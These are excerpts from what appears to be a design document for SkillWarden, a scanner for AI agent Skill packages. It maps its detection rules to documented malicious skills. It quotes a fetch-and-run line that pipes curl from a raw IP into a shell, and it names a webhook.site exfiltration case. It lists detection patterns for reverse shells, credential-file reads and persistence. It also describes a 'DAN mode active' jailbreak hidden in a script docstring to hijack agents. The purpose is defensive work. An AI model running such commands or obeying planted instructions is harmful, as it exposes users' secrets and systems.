...
> Skills (`SKILL.md` packages), and how SkillWarden's eight deterministic rule categories map
> onto them.
...
## 6. Mapping to SkillWarden's eight rule categories

SkillWarden scans **every text file in the skill directory**, not just `SKILL.md` — the
`better-polymarket` backdoor sat around line 180 of a bundled Python file. Since 0.6.0
`prompt-injection` also scans bundled scripts, because an agent reads a helper script's
docstrings and comments before running it (SkillTrustBench cases hid "DAN mode active"
in a `_compat_shim.py` docstring).
...
| `dangerous-commands` | `curl\|bash`, pipe-to-interpreter, base64-into-shell, `rm -rf /`, `sudo`, reverse shells, cron/systemd persistence (incl. argv-form `crontab`), shell-profile appends through a runtime, `.pth` files in `site-packages`, interpreter/loader hooks (`PYTHONSTARTUP`, `LD_PRELOAD`, `NODE_OPTIONS`), detached `nohup`/`setsid` processes, history tampering, `chmod 777` | ClawHavoc macOS one-liner; `os.system("curl -s http://54.91.154.110:13338/\|sh")` | Yes — `critical` on both (verified locally 2026-08-04) |
...
| `exfiltration` | Network calls carrying env secrets, env dumps piped to network tools, env harvesting loops filtered by secret names, reads of `~/.ssh`/`~/.aws`/`~/.netrc`/`~/.npmrc` (shell **and** language-runtime forms), dead-drop services (webhook.site, requestbin, interactsh…), ephemeral tunnels (ngrok, trycloudflare), raw-IP URLs and bare public-IP endpoint constants, host/workspace fingerprint telemetry, disposable free-tier collectors, data POSTed to public ntfy.sh topics | `rankaj` → `https://webhook.site/…` | Yes — `critical` dead-drop hit (verified locally 2026-08-04). Note the *file path* it read (`~/.clawdbot/.env`) was not itself flagged (§7 R5) |
| `dangerous-scripts` | `eval`/`exec` of decoded, reversed/re-joined, or list-driven payloads, download-then-execute chains, large base64 blobs, hex-escape and char-code obfuscation, shell built by string interpolation, bundled agent hook/config files (`.claude/hooks/`, `settings.json`, `mcp.json`) that run outside the skill's invocation | ClawHavoc staged droppers; obfuscated bundled scripts | Yes for the published shapes |
...
| `known-advisory` | Skill name matches a non-generic name from a published `SKA-*` advisory, or skill content references a documented campaign domain (`indicators.domains`) — bundled, offline | Re-uploads/clones of documented malicious skills — e.g. `better-polymarket` (SKA-2026-0004), `seedance2-api` (SKA-2026-0018); renamed skills still using documented infrastructure — e.g. `skillpay.me` billing (SKA-2026-0020) | Yes for documented names and domains; renamed re-uploads on new infrastructure are a gap (§7 R2) |
...
## 7. Residual risk — what the eight rules do **not** cover
